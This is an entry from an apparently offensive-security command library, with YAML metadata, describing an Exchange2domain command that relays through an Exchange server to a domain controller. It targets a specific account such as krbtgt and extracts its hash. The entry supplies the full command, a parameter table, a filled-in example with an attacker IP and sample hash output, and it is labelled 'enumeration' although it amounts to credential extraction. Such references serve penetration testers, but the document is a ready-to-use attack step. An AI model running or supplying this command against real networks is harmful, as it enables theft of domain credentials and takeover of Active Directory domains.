---
id: 7a59648e-da31-458a-b476-e3d845ac55db
name: exchange2domain-run-dc-user-enumeration
type: command
executor: bash
data: >-
  python Exchange2domain.py -ah $_ATTACKER_IP -u $_USERNAME -p $_PASSWORD -d
  $_DOMAIN -th $_DC_IP --just-dc-user $_TARGET_USER $_MAIL_SERVER_IP
output: null
created_at: '2023-04-06T03:56:08.023354+00:00'
updated_at: '2023-04-10T20:26:32.381858+00:00'
platforms:
  - Linux
tags:
  - enumeration
  - active-directory
verified: true
validated: true
---

# exchange2domain-run-dc-user-enumeration

## Command

```bash
python Exchange2domain.py -ah $_ATTACKER_IP -u $_USERNAME -p $_PASSWORD -d $_DOMAIN -th $_DC_IP --just-dc-user $_TARGET_USER $_MAIL_SERVER_IP
```

## Description

Targets specific DC users (e.g., krbtgt) for enumeration using Exchange2domain, focusing on high-value accounts without full listening.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ah $_ATTACKER_IP | Attacker IP | Yes |
| -u $_USERNAME | Username | Yes |
| -p $_PASSWORD | Password | Yes |
| -d $_DOMAIN | Domain | Yes |
| -th $_DC_IP | DC IP | Yes |
| --just-dc-user $_TARGET_USER | Target user (e.g., krbtgt) | Yes |
| $_MAIL_SERVER_IP | Mail server IP/hostname | Yes |

## Examples

### Basic Usage

```bash
python Exchange2domain.py -ah 192.168.1.100 -u user -p pass -d domain.local -th 10.0.0.1 --just-dc-user krbtgt mail01.domain.local
```

## Expected Output

[*] Targeting krbtgt via Exchange
krbtgt:500:... (hash or details)

## Related

- [[procedures/PrivExchange-Attack-with-NTLM-Relay]]
